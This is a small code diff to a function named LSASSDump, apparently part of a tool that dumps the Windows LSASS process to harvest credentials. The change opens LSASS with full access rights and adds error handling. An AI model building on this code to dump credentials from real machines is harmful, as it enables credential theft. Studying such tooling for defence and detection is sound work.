@@ -21,5 +21,9 @@ void LSASSDump()
     }
 
     lsassProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, lsassPID);
-    
+    if (!lsassProcess){
+        printf("[!] Could not open LSASS Process! %d\n", GetLastError());
+        exit(-1);
+    }
+
 }
